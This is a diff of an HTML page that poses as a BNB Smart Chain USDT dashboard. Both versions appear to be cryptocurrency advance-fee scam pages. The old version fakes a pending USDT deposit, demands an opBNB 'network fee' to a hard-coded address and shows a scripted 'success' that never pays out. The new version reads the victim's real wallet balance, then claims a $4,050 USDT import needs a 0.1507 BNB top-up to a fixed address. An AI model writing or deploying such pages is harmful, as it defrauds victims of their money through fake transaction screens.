@@ -1,135 +1,161 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>𝗕𝗦𝗖𝗦𝗖𝗔𝗡.𝗢𝗥𝗚</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDT Dashboard - BNB Smart Chain</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
   <style>
-    body { font-family:'Inter',sans-serif; background:#F8F9FA; margin:0; padding:0;
-      display:flex; justify-content:center; align-items:center; min-height:100vh; }
-    .container { background:#FFF; border:1px solid #DEE2E6; border-radius:8px;
-      padding:30px; width:100%; max-width:480px; text-align:center; box-shadow:0 2px 8px rgba(0,0,0,0.05); }
-    h1 { color:#2B6CB0; margin-bottom:20px; }
-    input, select { width:100%; padding:10px; margin:10px 0; border:1px solid #CED4DA; border-radius:4px; }
-    .btn { background:#2B6CB0; color:#fff; border:none; padding:10px 20px; margin:10px 5px;
-      border-radius:4px; cursor:pointer; font-weight:600; }
-    .btn:hover { background:#1A4A7A; }
-    .status, .wallet-status { color:#4A5568; margin:10px 0; font-size:14px; }
-    .back-btn { position:absolute; top:15px; left:15px; background:none; border:none; color:#2B6CB0; font-size:24px; cursor:pointer; }
-    .chart-container { margin:20px 0; height:300px; }
-    .hidden { display:none; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #0b0e11;
+      color: #f0f0f0;
+      padding: 2rem;
+    }
+    h1 {
+      text-align: center;
+      color: #fcd535;
+    }
+    .card {
+      background-color: #1e2329;
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin: 2rem auto;
+      max-width: 600px;
+      text-align: center;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+    }
+    .btn-yellow {
+      background-color: #fcd535;
+      color: #000;
+      padding: 0.75rem 1.5rem;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: pointer;
+      margin-top: 1rem;
+    }
+    .address-box {
+      background-color: #121416;
+      padding: 1rem;
+      border-radius: 8px;
+      word-break: break-all;
+      font-family: monospace;
+      margin: 1rem 0;
+    }
+    .stat {
+      margin-top: 1rem;
+    }
+    .stat h3 {
+      margin: 0.2rem 0;
+      color: #fcd535;
+    }
+    .logos {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 1rem;
+      margin: 2rem 0;
+    }
+    .logos img {
+      height: 40px;
+      filter: brightness(1.2);
+    }
   </style>
 </head>
 <body>
-  <button class="back-btn hidden" onclick="goBack()">&lt;</button>  <div class="container" id="page1">
-    <h1>𝗕𝗡𝗕 𝗦𝗺𝗮𝗿𝘁 𝗖𝗵𝗮𝗶𝗻</h1>
-    <input type="text" id="manualAddress" placeholder="Enter BSC Address" />
-    <button class="btn" onclick="connectWallet()">Connect Wallet</button>
-  </div>  <div class="container hidden" id="dashboard">
-    <h1>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗪𝗮𝗹𝗹𝗲𝘁 𝗦𝗼𝘂𝗿𝗰𝗲 𝗗𝗮𝘀𝗵𝗯𝗼𝗮𝗿𝗱</h1>
-    <p>𝗔𝗗𝗗𝗥𝗘𝗦𝗦: <span id="shortAddress"></span></p>
-    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗽𝗲𝗻𝗱𝗶𝗻𝗴.........</p>
-    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝘀𝗼𝘂𝗿𝗰𝗲: Binance</p>
-    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗔𝗺𝗼𝘂𝗻𝘁: $3470.78 USDT</p>
-    <p>𝗡𝗲𝘁𝘄𝗼𝗿𝗸: Binance chain BSC BEP20</p>
-    <p>𝗡𝗲𝘁𝘄𝗼𝗿𝗸 𝗙𝗲𝗲: 0.12109 opBNB</p>
-    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: in progress</p>
-    <div class="chart-container">
-      <div id="tradingview-widget"></div>
+
+  <h1>BNB Smart Chain USDT Dashboard</h1>
+
+  <div class="logos">
+    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="Binance" />
+    <img src="https://cryptologos.cc/logos/bitget-bgb-logo.png" alt="Bitget" />
+    <img src="https://cryptologos.cc/logos/bybit-logo.png" alt="Bybit" />
+    <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" alt="TrustWallet" />
+    <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png" alt="Coinbase" />
+    <img src="https://cryptologos.cc/logos/metamask-logo.png" alt="MetaMask" />
+    <img src="https://walletconnect.com/walletconnect-logo.svg" alt="WalletConnect" />
+  </div>
+
+  <div class="card">
+    <p><strong>Connected Wallet Address:</strong></p>
+    <div class="address-box" id="walletAddress">Not connected</div>
+
+    <div class="stat">
+      <h3 id="usdtBalance">$0.00</h3>
+      <p>Your USDT Balance (BEP-20)</p>
     </div>
-    <button class="btn" onclick="nextPage('confirm1')">Confirm</button>
-  </div>  <div class="container hidden" id="confirm1">
-    <h1>Confirm opBNB</h1>
-    <button class="btn" onclick="nextPage('confirm2')">Confirm opBNB</button>
-  </div>  <div class="container hidden" id="confirm2">
-    <h1>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗻 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀......</h1>
-    <button class="btn" onclick="nextPage('contractInput')">Confirm</button>
-  </div>  <div class="container hidden" id="contractInput">
-    <h1>𝗜𝗻𝗽𝘂𝘁 𝗼𝗽𝗕𝗡𝗕 𝗖𝗼𝗻𝘁𝗿𝗮𝗰𝘁 𝗖𝗼𝗱𝗲</h1>
-    <p>𝗡𝗲𝘁𝘄𝗼𝗿𝗸: BNB Smart Chain BEP20:</p>
-    <p>𝗧𝗼𝗽-𝗨𝗽: 0.12109 opBNB</p>
-    <p><strong>0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</strong></p>
-    <input type="text" id="contractCode" placeholder="Enter contract code" />
-    <button class="btn" onclick="verifyContract()">Confirm contract transaction</button>
-    <div class="status" id="verifyStatus"></div>
-  </div>  <div class="container hidden" id="success">
-    <h1>✅ 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟</h1>
-    <p>𝗔𝗺𝗼𝘂𝗻𝘁: $3270.78 USDT</p>
-    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝘀𝗼𝘂𝗿𝗰𝗲: 0x55d398326f99059ff775485246999027b3197955</p>
-    <p>𝗡𝗲𝘁𝘄𝗼𝗿𝗸: BNB Smart Chain BEP20</p>
-    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: Successful✅️</p>
-    <p>𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗡𝗼𝘁𝗲: To be credited to user address in 27HRS</p>
-  </div>  <div class="container hidden" id="declined">
-    <h1>❌ 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗</h1>
-    <p>Invalid contract code.</p>
-  </div>  <script>
-    let pageHistory = [];
 
-    function showPage(id) {
-      document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
-      document.getElementById(id).classList.remove('hidden');
-      document.querySelector('.back-btn').classList.toggle('hidden', pageHistory.length === 0);
-    }
+    <button class="btn-yellow" onclick="connectAndImport()">Connect Wallet & Import USDT</button>
+  </div>
 
-    function nextPage(id) {
-      const current = document.querySelector('.container:not(.hidden)').id;
-      pageHistory.push(current);
-      showPage(id);
-    }
+  <div class="card">
+    <h3>Confirm Incoming Transaction</h3>
+    <p>Not Enough BNB to Import: <strong>$4050 USDT</strong></p>
+    <p>Top up <strong>0.1507 BNB</strong> to your BSC address:</p>
+    <div class="address-box" id="bscAddress">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</div>
+    <button class="btn-yellow" onclick="copyAddress()">Copy Address</button>
+  </div>
 
-    function goBack() {
-      if (pageHistory.length > 0) {
-        const prev = pageHistory.pop();
-        showPage(prev);
+  <!-- WalletConnect + Web3 -->
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+
+  <script>
+    const usdtAddress = "0x55d398326f99059ff775485246999027b3197955";
+    const usdtABI = [
+      {
+        constant: true,
+        inputs: [{ name: "owner", type: "address" }],
+        name: "balanceOf",
+        outputs: [{ name: "balance", type: "uint256" }],
+        type: "function"
+      },
+      {
+        constant: true,
+        inputs: [],
+        name: "decimals",
+        outputs: [{ name: "", type: "uint8" }],
+        type: "function"
       }
-    }
+    ];
 
-    async function connectWallet() {
-      const inputAddr = document.getElementById("manualAddress").value.trim();
-      if (!/^0x[a-fA-F0-9]{40}$/.test(inputAddr)) return alert("Invalid BSC address");
-      localStorage.setItem("connectedAddress", inputAddr);
-      document.getElementById("shortAddress").innerText = inputAddr.slice(0,6) + "..." + inputAddr.slice(-4);
-      showPage("dashboard");
-    }
-
-    async function verifyContract() {
-      const code = document.getElementById("contractCode").value.trim();
-      const status = document.getElementById("verifyStatus");
-      if (code === "0x55d398326f99059ff775485246999027b3197955") {
-        status.innerText = "⏳ Processing...";
-        setTimeout(() => {
-          showPage("success");
-          setTimeout(() => {
-            showPage("dashboard");
-            document.getElementById("shortAddress").innerText = "0000.00";
-          }, 20000);
-        }, 60000);
-      } else {
-        showPage("declined");
-        setTimeout(() => showPage("contractInput"), 5000);
-      }
-    }
-
-    window.onload = () => {
-      const saved = localStorage.getItem("connectedAddress");
-      if (saved) {
-        document.getElementById("shortAddress").innerText = saved.slice(0,6) + "..." + saved.slice(-4);
-        showPage("dashboard");
-      } else {
-        showPage("page1");
-      }
-
-      new TradingView.widget({
-        "width": "100%",
-        "height": 300,
-        "symbol": "BINANCE:BNBUSDT",
-        "interval": "D",
-        "timezone": "Etc/UTC",
-        "theme": "light",
-        "style": "1",
-        "locale": "en",
-        "container_id": "tradingview-widget"
+    async function connectAndImport() {
+      const provider = new WalletConnectProvider.default({
+        rpc: {
+          56: "https://bsc-dataseed.binance.org/"
+        },
+        chainId: 56,
+        qrcode: true
       });
-    };
-  </script>  <script src="https://s3.tradingview.com/tv.js"></script></body>
+
+      try {
+        await provider.enable();
+        const web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts();
+        const userAddress = accounts[0];
+
+        document.getElementById("walletAddress").innerText = userAddress;
+
+        const contract = new web3.eth.Contract(usdtABI, usdtAddress);
+        const decimals = await contract.methods.decimals().call();
+        const balanceRaw = await contract.methods.balanceOf(userAddress).call();
+        const balanceFormatted = (balanceRaw / Math.pow(10, decimals)).toFixed(2);
+
+        document.getElementById("usdtBalance").innerText = `$${balanceFormatted}`;
+      } catch (error) {
+        console.error("Connection error:", error);
+        alert("Wallet connection failed or canceled.");
+      }
+    }
+
+    function copyAddress() {
+      const address = document.getElementById("bscAddress").innerText;
+      navigator.clipboard.writeText(address).then(() => {
+        alert("Address copied to clipboard!");
+      });
+    }
+  </script>
+
+</body>
 </html>
